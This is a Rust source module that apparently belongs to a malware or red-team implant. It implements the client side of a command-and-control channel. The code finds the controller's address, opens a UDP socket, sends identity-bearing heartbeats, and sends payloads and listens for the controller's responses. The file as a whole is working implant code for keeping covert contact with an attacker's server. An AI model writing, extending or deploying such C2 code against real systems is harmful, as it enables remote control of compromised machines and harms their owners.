use std::{net::SocketAddr, time::Duration};
use thiserror::Error;
use tokio::{net::UdpSocket, time::timeout};

use crate::identity::Identity;

pub mod payloads;
mod reach;

#[derive(Error, Debug)]
pub enum C2ComError {
    #[error(transparent)]
    ReachFailure(#[from] reach::ReachError),

    #[error("C2Com connection failure. {0}")]
    ConnectionFailure(#[from] std::io::Error),

    #[error("C2Com timeout occurred. {0}")]
    Timeout(String),
}

pub struct C2Com {
    udp_sock: Option<UdpSocket>,
    remote_addr: Option<SocketAddr>,
}

pub fn init() -> C2Com {
    C2Com {
        udp_sock: None,
        remote_addr: None,
    }
}

impl C2Com {
    pub async fn send_bytes(&mut self, data: &[u8]) -> Result<(), C2ComError> {
        setup_communications(self).await?;

        if let (Some(sock), Some(remote)) = (&self.udp_sock, self.remote_addr) {
            println!("c2>> sending bytes via udp socket.");
            timeout(Duration::from_secs(10), sock.send_to(data, remote))
                .await
                .map_err(|_| {
                    C2ComError::Timeout("Timed out sending payload to c2 via udp.".into())
                })??;
        }

        Ok(())
    }

    pub async fn send_bytes_to(&self, addr: SocketAddr, data: &[u8]) -> Result<(), C2ComError> {
        let Some(sock) = &self.udp_sock else {
            return Ok(());
        };

        timeout(Duration::from_secs(5), sock.send_to(data, addr))
            .await
            .map_err(|_| C2ComError::Timeout("Timed out sending response via udp.".into()))??;

        Ok(())
    }

    pub async fn ask(&mut self, payload: &[u8]) -> Result<Option<Vec<u8>>, C2ComError> {
        self.send_bytes(payload).await?;

        if let Some((response, _)) = self.listen(10).await? {
            println!("c2<< got ask-response ({}) via udp socket.", response.len());
            return Ok(Some(response));
        }

        println!("c2-- no ask-response via udp socket.");
        Ok(None)
    }

    pub async fn heartbeat(&mut self, identity: &Identity) {
        match payloads::heartbeat(identity) {
            Ok(payload) => {
                if let Err(err) = self.send_bytes(&payload).await {
                    eprintln!("c2!! heartbeat failed. {err}");
                }

                println!("c2ii sent heartbeat.");
            }
            Err(err) => {
                eprintln!("heartbeat payload failed. {err}");
            }
        }
    }

    pub async fn listen(
        &self,
        timeout_secs: u16,
    ) -> Result<Option<(Vec<u8>, SocketAddr)>, C2ComError> {
        let Some(sock) = self.udp_sock.as_ref() else {
            return Ok(None);
        };

        let mut buf = [0u8; 65535];

        let received_opt = if timeout_secs == 0 {
            sock.recv_from(&mut buf).await.ok()
        } else {
            timeout(
                Duration::from_secs(timeout_secs as u64),
                sock.recv_from(&mut buf),
            )
            .await
            .ok()
            .transpose()?
        };

        if let Some((len, addr)) = received_opt {
            println!("got listen packet from: {}", addr);
            return Ok(Some((buf[..len].to_vec(), addr)));
        }

        Ok(None)
    }
}

async fn setup_communications(c2com: &mut C2Com) -> Result<(), C2ComError> {
    if c2com.udp_sock.is_some() {
        return Ok(());
    }

    println!("+--- setting up c2 coms ---+");

    let reach_info = reach::reach_c2().await?;
    match reach_info.com_mode {
        reach::ReachComMode::UDP => {
            println!(" - identified udp reach method.");
            let remote_addr =
                SocketAddr::new(std::net::IpAddr::V4(reach_info.ipv4), reach_info.port);

            let sock = UdpSocket::bind("0.0.0.0:0").await?;

            println!(" - setup udp socket for c2 ({remote_addr}).");
            c2com.udp_sock = Some(sock);
            c2com.remote_addr = Some(remote_addr);
        }
        reach::ReachComMode::HTTP => {
            eprintln!("HTTP C2Com mode not yet implemented.")
        }
    }

    println!();
    Ok(())
}
